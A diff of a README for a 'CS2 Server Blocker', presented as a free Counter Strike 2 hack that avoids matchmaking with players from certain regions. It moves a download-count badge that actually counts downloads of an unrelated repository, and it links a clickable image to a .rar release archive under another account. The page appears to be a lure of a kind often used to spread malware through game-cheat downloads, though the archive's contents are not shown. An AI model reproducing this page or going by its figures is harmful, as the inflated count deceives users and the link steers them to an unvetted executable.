@@ -4,6 +4,8 @@ CS2 Server Blocker is the right answer if you are a fan of Counter Strike 2, you
 
 ![azd](https://i.imgur.com/7SaCppN.jpg)
 
+![tr](https://img.shields.io/github/downloads/osmancitci/GrandRp-Farm/total?color=HSL%28230%C2%B0%2C%200%25%2C%2050%25%29&label=Downloads) 
+
 ## About the CS2 Server Blocker
 
 CS2 Server Blocker is a free hack for Counter Strike 2 that allows you to block matchmaking with other players from specific regions, such as Russia, Ukraine, and Turkey. This way, you can avoid laggy servers, language barriers, and annoying teammates who ruin your fun. You can choose which regions you want to block or allow, and customize your preferences according to your needs.
@@ -14,8 +16,6 @@ It's a simple and effective solution for improving your Counter Strike 2 gamepla
 
 ## How to Use the CS2 Server Blocker
 1. Download the tool from releases or CLICK on image below for automatically download.
-
-![tr](https://img.shields.io/github/downloads/osmancitci/GrandRp-Farm/total?color=HSL%28230%C2%B0%2C%200%25%2C%2050%25%29&label=Downloads) 
 
 [![tr](https://github.com/osmancitci/GrandRp-Farm/blob/main/Template/Download.png?raw=true)](https://github.com/paXn281/CS2-Server-Blocker/releases/download/v2/ServerBlocker.rar)
 
